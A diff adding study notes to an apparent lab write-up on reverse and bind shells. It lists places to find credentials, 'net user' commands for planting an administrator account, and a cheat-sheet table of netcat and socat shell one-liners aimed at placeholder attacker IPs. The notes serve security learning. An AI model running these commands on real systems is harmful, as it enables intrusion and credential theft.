@@ -529,3 +529,50 @@ When the target is Windows, it is often easiest to obtain RCE using a web shell,
 This is the same shell we encountered in Task 8, however, it has been URL encoded to be used safely in a GET parameter. Remember that the IP and Port (bold, towards end of the top line) will still need to be changed in the above code.
 
 # Next steps
+
+Ok, we have a shell. Now what?  
+
+We've covered lots of ways to generate, send and receive shells. The one thing that these all have in common is that they tend to be unstable and non-interactive. Even Unix style shells which are easier to stabilise are not ideal. So, what can we do about this?
+
+On Linux ideally we would be looking for opportunities to gain access to a user account. SSH keys stored at `/home/<user>/.ssh` are often an ideal way to do this. In CTFs it's also not infrequent to find credentials lying around somewhere on the box. Some exploits will also allow you to add your own account. In particular something like [Dirty C0w](https://dirtycow.ninja/) or a writeable /etc/shadow or /etc/passwd would quickly give you SSH access to the machine, assuming SSH is open.
+
+On Windows the options are often more limited. It's sometimes possible to find passwords for running services in the registry. VNC servers, for example, frequently leave passwords in the registry stored in plaintext. Some versions of the FileZilla FTP server also leave credentials in an XML file at `C:\Program Files\FileZilla Server\FileZilla Server.xml`  
+ or `C:\xampp\FileZilla Server\FileZilla Server.xml`. These can be MD5 hashes or in plaintext, depending on the version.
+
+Ideally on Windows you would obtain a shell running as the SYSTEM user, or an administrator account running with high privileges. In such a situation it's possible to simply add your own account (in the administrators group) to the machine, then log in over RDP, telnet, winexe, psexec, WinRM or any number of other methods, dependent on the services running on the box.
+
+The syntax for this is as follows:
+
+`net user <username> <password> /add`
+
+`net localgroup administrators <username> /add`
+
+---
+
+_The important take away from this task:_
+
+Reverse and Bind shells are an essential technique for gaining remote code execution on a machine, however, they will never be as fully featured as a native shell. Ideally we always want to escalate into using a "normal" method for accessing the machine, as this will invariably be easier to use for further exploitation of the target.
+
+# Summary
+
+|OS|Previous steps|Attacker's machine|Target's machine|Result|
+|--|--|--|--|--|
+|Linux|Get a custom webshell|1. `nc -lvnp <port>`|2. `nc <attck-ip> <port> -e /bin/bash`|If we enter on the url a parameter when uploading the webshell like `webshell.php?cmd=nc <attck-ip> <port> -e /bin/bash` we got access|
+|Linux|1. Get a custom webshell 2. Login ssh|1. `nc -lvnp <port>`|2. `nc <attck-ip> <port> -e /bin/bash`|You get a reverse shell|
+|Linux|1. Login ssh|2. `nc <target ip> <target port>`|1. `nc -lvnp <port> -e /bin/bash`|You get a bind shell|
+|Linux|If `-e/bin/bash` disn't work, try this|2. `nc <target ip> <target port>` |1. `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f or* /bin/sh >/tmp/f 2>&1; rm /tmp/f`|You get a bind shell|
+|Linux||1. `socat TCP-L:<port> -`|2. `socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:"bash -li"`|You get a reverse shell with Socat|
+|Linux||2. `socat TCP:<TARGET-IP>:<TARGET-PORT> -`|1. `socat TCP-L:<PORT> EXEC:”bash -li”`|You get a bind shel with Socat|
+|Linux||1. `socat TCP-L:<port> FILE:`tty`,raw,echo=0`|2. `socat TCP:<attacker-ip>:<attacker-port> EXEC:”bash -li”,pty,stderr,sigint,setsid,sane`|You get a fully stable reverse shell with Socat|
+
+
+
+
+or*: poner un | en lugar de or: `mkfifo /tmp/f; nc -lvnp <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f`
+## Commands for stabilizing shell
+
+1. `python -c 'import pty;pty.spawn("/bin/bash")'`
+2. `export TERM=xterm`
+3. Background the shell using Ctrl + Z. Back in our own terminal we use `stty raw -echo; fg`
+
+
